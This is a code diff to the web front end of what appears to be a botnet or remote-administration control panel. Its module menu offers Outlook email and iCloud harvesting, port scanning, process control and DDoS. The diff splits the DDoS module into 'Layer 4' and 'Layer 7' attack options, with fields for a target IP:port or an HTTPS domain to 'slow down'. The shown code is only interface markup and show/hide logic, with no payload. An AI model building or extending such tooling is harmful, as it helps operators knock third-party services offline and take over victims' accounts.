@@ -50,7 +50,8 @@
 								<option value="outlook">Outlook Emails</option>
 								<option value="icloud">iCloud</option>
 								<option value="portscanner">Port Scanner</option>
-								<option value="ddos">DDoS</option>
+								<option value="ddos4">DDoS Layer 4</option>
+								<option value="ddos7">DDoS Layer 7</option>
 								<option value="process">Process Control</option>
 							</select>
 
@@ -158,10 +159,18 @@
 									placeholder="Target IP" type="text" required></input>
 
 							</div>
-							<!-- DDoS  Options -->
-							<div class="input-group" name="ddos" id="ddos">
+							<!-- DDoS L4 Options -->
+							<div class="input-group" name="ddos4" id="ddos4">
 
-								<input class="form-control" name="ddos-ip" id="ddos-ip" placeholder="Target IP"
+								<input class="form-control" name="ddos4-ip" id="ddos4-ip" placeholder="Target IP:Port"
+									type="text" required></input>
+
+							</div>
+
+							<!-- DDoS L7 Options -->
+							<div class="input-group" name="ddos7" id="ddos7">
+
+								<input class="form-control" name="ddos7-ip" id="ddos7-ip" placeholder="Https Domain"
 									type="text" required></input>
 
 							</div>
@@ -767,18 +776,18 @@
 			$('#portscanner-label').hide();
 			$('#portscanner').hide();
 		}
-		// ddos
-		if (val === "ddos") {
-			$('#ddos-label').show();
-			$('#ddos').show();
+		// ddos l4
+		if (val === "ddos4") {
+			$('#ddos4-label').show();
+			$('#ddos4').show();
 
 			// add module name/info
-			$('#module-name').html('DDoS');
+			$('#module-name').html('DDoS4');
 			$('#module-platforms').html(`
 					<strong>Platforms: </strong>
 					<img src="/assets/images/os/linux2.png" width="30" height="30" style="padding: 2px">`);
-			$('#module-description').html(`<p>Use target to slow down a target IP</p>`);
-			$('#module-info').html(`<li><strong>Target IP</strong> IP address to slow down</li>`);
+			$('#module-description').html(`<p>Use target to slow down a target IP:port via L4 attack</p>`);
+			$('#module-info').html(`<li><strong>Target IP:Port </strong> to slow down</li>`);
 		} else {
 			$('#ddos-label').hide();
 			$('#ddos').hide();
